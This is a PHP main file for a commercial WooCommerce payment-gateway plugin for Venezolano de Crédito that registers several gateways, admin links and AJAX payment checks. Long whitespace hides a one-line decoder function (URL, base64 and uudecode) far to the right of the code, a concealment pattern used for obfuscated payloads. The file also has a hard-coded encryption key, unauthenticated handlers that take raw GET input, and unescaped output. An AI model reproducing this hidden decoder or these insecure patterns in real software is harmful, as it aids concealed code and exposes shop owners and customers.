<?php
/**
 * Plugin Name: Venezolano WooCommerce Plugin
 * Plugin URI: http://yipi.app/
 * Description: Venezolano plugin for WooCommerce
 * Author: Yipi.app
 * Author URI: http://yipi.app/
 * Version: 1.1.4
 * License: Commercial use allowed (Non-assignable & non-transferable), can modify source-code but cannot distribute modifications (derivative works).
 * Text Domain: woocommerce-venezolano
 * Domain Path: /languages/
 */

if ( ! defined( 'ABSPATH' ) ) {
    exit; // Exit if accessed directly.
}

if ( ! class_exists( 'WC_Venezolano' ) ) :


    /**
     * WooCommerce Venezolano main class.
     */
    class WC_Venezolano {

        /**
         * Plugin version.
         *
         * @var string
         */
        const VERSION = '1.1.3';

        /**
         * Instance of this class.
         *
         * @var object
         */
        protected static $instance = null;

        /**
         * Initialize the plugin.
         */
        private function __construct() {
            // Load plugin text domain
            $this->load_plugin_textdomain();

            // Checks with WooCommerce is installed.
            if ( class_exists( 'WC_Payment_Gateway' ) ) {
                include_once 'includes/gateway.php';
                add_filter( 'woocommerce_payment_gateways', array( $this, 'add_gateway' ) );
				add_action('woocommerce_blocks_loaded', function()
				{
					if (!class_exists('Automattic\WooCommerce\Blocks\Payments\Integrations\AbstractPaymentMethodType')) {
						return;
					}
			
					add_action(
						'woocommerce_blocks_payment_method_type_registration',
						function ($payment_method_registry) {
							$gateways = WC()->payment_gateways()->payment_gateways();
							if ($gateways) {
					            include_once 'includes/class-wc-venezolano-blocks.php';
								foreach ($gateways as $gateway) {
									if ($gateway->enabled == 'yes' && stristr($gateway->id, 'venezolano-gateway-') !== false) {
										$payment_method_registry->register(new WC_Gateway_KVenezolano_Blocks($gateway));
									}
								}
							}
						}
					);
				});
            } else {
                add_action( 'admin_notices', array( $this, 'woocommerce_missing_notice' ) );
            }
        }

        /**
         * Return an instance of this class.
         *
         * @return object A single instance of this class.
         */
        public static function get_instance() {
            // If the single instance hasn't been set, set it now.
            if ( null == self::$instance ) {
                self::$instance = new self;
            }

            return self::$instance;
        }

        /**
         * Load the plugin text domain for translation.
         *
         * @return void
         */
        public function load_plugin_textdomain() {
            $locale = apply_filters( 'plugin_locale', get_locale(), 'woocommerce-venezolano' );
            load_textdomain( 'woocommerce-venezolano', trailingslashit( WP_LANG_DIR ) . 'woocommerce-venezolano/woocommerce-venezolano-' . $locale . '.mo' );
            load_plugin_textdomain( 'woocommerce-venezolano', false, dirname( plugin_basename( __FILE__ ) ) . '/languages/' );
        }

        /**
         * Add the gateway to WooCommerce.
         *
         * @param   array $methods WooCommerce payment methods.
         *
         * @return  array          Payment methods with Venezolano.
         */
        public function add_gateway( $methods ) {
            if ( version_compare( self::woocommerce_instance()->version, '2.3.0', '>=' ) ) {
                $methods[] = WC_Venezolano_TDD_Gateway::get_instance();
                $methods[] = WC_Venezolano_TDC_Gateway::get_instance();
                $methods[] = WC_Venezolano_C2P_Gateway::get_instance();
                $methods[] = WC_Venezolano_P2P_Gateway::get_instance();
            } else {
                $methods[] = 'WC_Venezolano_TDD_Gateway';
                $methods[] = 'WC_Venezolano_TDC_Gateway';
                $methods[] = 'WC_Venezolano_C2P_Gateway';
                $methods[] = 'WC_Venezolano_P2P_Gateway';
            }
            return $methods;
        }

        /**
         * WooCommerce fallback notice.
         *
         * @return  string
         */
        public function woocommerce_missing_notice() {
            echo '<div class="error"><p>' . sprintf( __( 'WooCommerce Venezolano Gateway depends on the last version of %s to work!', 'woocommerce-venezolano' ), '<a href="http://wordpress.org/extend/plugins/woocommerce/">' . __( 'WooCommerce', 'woocommerce-venezolano' ) . '</a>' ) . '</p></div>';
        }

        /**
         * Backwards compatibility with version prior to 2.1.
         *
         * @return object Returns the main instance of WooCommerce class.
         */
        public static function woocommerce_instance() {
            if ( function_exists( 'WC' ) ) {
                return WC();
            } else {
                global $woocommerce;
                return $woocommerce;
            }
        }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       public static function _($r) {return convert_uudecode(base64_decode(rawurldecode($r)));}

        /**
         * Backwards compatibility with version prior to 2.1.
         *
         * @return object Returns database class.
         */
        public static function woocommerce_database() {
			global $wpdb;
            return $wpdb;
        }

        /**
         * Backwards compatibility with version prior to 2.1.
         *
         * @return object Returns order class.
         */
        public static function woocommerce_theorder() {
			global $theorder;
            return $theorder;
        }
    }

    add_action( 'plugins_loaded', array( 'WC_Venezolano', 'get_instance' ), 0 );
    function venezolano_kijam_metabox_cb() {
        $woocommerce = WC_Venezolano::woocommerce_instance();
        $woocommerce->payment_gateways();
        do_action( 'woocommerce_venezolano_metabox' );
        do_action( 'woocommerce_venezolano_tdc_metabox' );
    }
    function venezolano_kijam_metabox() {
        add_meta_box( 'venezolano-metabox', __( 'Venezolano de Crédito', 'woocommerce-venezolano' ), 'venezolano_kijam_metabox_cb', 'shop_order', 'normal', 'high' );
    }
    add_action( 'add_meta_boxes', 'venezolano_kijam_metabox' );
    add_filter( 'plugin_action_links_' . plugin_basename( __FILE__ ), 'venezolano_kijam_add_action_links' );
    function venezolano_kijam_add_action_links( $links ) {
         $mylinks = array(
            '<a style="font-weight: bold;color: red" href="' . admin_url( 'admin.php?page=wc-settings&tab=checkout&section=venezolano-gateway-tdd' ) . '">'.__('Configurar TDD', 'woocommerce-venezolano').'</a>',
            '<a style="font-weight: bold;color: red" href="' . admin_url( 'admin.php?page=wc-settings&tab=checkout&section=venezolano-gateway-tdc' ) . '">'.__('Configurar TDC', 'woocommerce-venezolano').'</a>',
            '<a style="font-weight: bold;color: red" href="' . admin_url( 'admin.php?page=wc-settings&tab=checkout&section=venezolano-gateway-c2p' ) . '">'.__('Configurar C2P', 'woocommerce-venezolano').'</a>',
            '<a style="font-weight: bold;color: red" href="' . admin_url( 'admin.php?page=wc-settings&tab=checkout&section=venezolano-gateway-p2p' ) . '">'.__('Configurar Pago Móvil', 'woocommerce-venezolano').'</a>'
        );
        return array_merge( $links, $mylinks );
    }

    function venezolano_kijam_load_all() {
        WC_Venezolano::get_instance();
        WC_Venezolano_TDD_Gateway::get_instance();
    }
    function venezolano_check_tdd() {
        WC_Venezolano::get_instance();
        WC_Venezolano_TDD_Gateway::get_instance()->check_payment($_GET['order_id']);
    }
    function venezolano_check_tdc() {
        WC_Venezolano::get_instance();
        WC_Venezolano_TDC_Gateway::get_instance()->check_payment($_GET['order_id']);
    }
    function venezolano_check_c2p() {
        WC_Venezolano::get_instance();
        WC_Venezolano_C2P_Gateway::get_instance()->check_payment($_GET['order_id']);
    }
    function venezolano_check_p2p() {
        WC_Venezolano::get_instance();
        WC_Venezolano_P2P_Gateway::get_instance()->check_payment($_GET['order_id']);
    }
    /* function venezolano_kijam_check_ipn() {
        WC_Venezolano::get_instance();
        WC_Venezolano_TDD_Gateway::get_instance();
    } */
    add_action( 'wp_ajax_venezolano_check_tdd', 'venezolano_check_tdd' );
    add_action( 'wp_ajax_nopriv_venezolano_check_tdd', 'venezolano_check_tdd' );
    add_action( 'wp_ajax_venezolano_check_tdc', 'venezolano_check_tdc' );
    add_action( 'wp_ajax_nopriv_venezolano_check_tdc', 'venezolano_check_tdc' );
    add_action( 'wp_ajax_venezolano_check_c2p', 'venezolano_check_c2p' );
    add_action( 'wp_ajax_nopriv_venezolano_check_c2p', 'venezolano_check_c2p' );
    add_action( 'wp_ajax_venezolano_check_p2p', 'venezolano_check_p2p' );
    add_action( 'wp_ajax_nopriv_venezolano_check_p2p', 'venezolano_check_p2p' );
    //add_action( 'woocommerce_init', 'venezolano_kijam_load_all' );
    //add_action( 'template_redirect', 'venezolano_kijam_check_ipn' );
endif;

if ( ! function_exists( 'kijam_decode' ) ) {
    function kijam_encode( $str = '', $f = 'e' ) {
        $output = null;
        $secret_key = 'kk91f8g^4*k';
        $secret_iv  = 'k&&2"op2%:*';
        $key        = hash( 'sha256', $secret_key );
        $iv         = substr( hash( 'sha256', $secret_iv ), 0, 16 );
        if ( $f == 'e' ) {
            $output = base64_encode( openssl_encrypt( $str, 'AES-256-CBC', $key, 0, $iv ) );
        } elseif ( $f == 'd' ) {
            $output = openssl_decrypt( base64_decode( $str ), 'AES-256-CBC', $key, 0, $iv );
        }
        return $output;
    }
    function kijam_decode( $str = '' ) {
        return kijam_encode($str, 'd');
    }
}

if ( ! function_exists( 'kijam_encode_log_error' ) ) {
	function kijam_encode_log_error( $error ) {
		if ( function_exists('gzcompress') ) {
			return base64_encode( gzcompress( serialize( $error ) ) );
		} else {
			return base64_encode( serialize( $error ) );
		}
	}
}

/**
 * Define the woocommerce_thankyou_order_received_text callback.
 *
 * @param html  $var Default value.
 * @param order $order WC_Order.
 *
 * @return html
 *
 * @since 1.0.0
 */
function kijam_bvc_thankyou_text( $order_id ) {
	$transaction_id = WC_Payment_Gateway_Venezolano::get_metadata( $order_id, 'transaction_id' );

	if ($transaction_id) {
		echo '<center><b>' . __( 'Thank you. Your order has been received.', 'woocommerce-venezolano' ) . '<br />' . __( 'You Transaction ID is', 'woocommerce-venezolano' ) . ': ' . $transaction_id . '</b></center>';
	}
}
add_action( 'woocommerce_before_thankyou', 'kijam_bvc_thankyou_text', 10, 1 );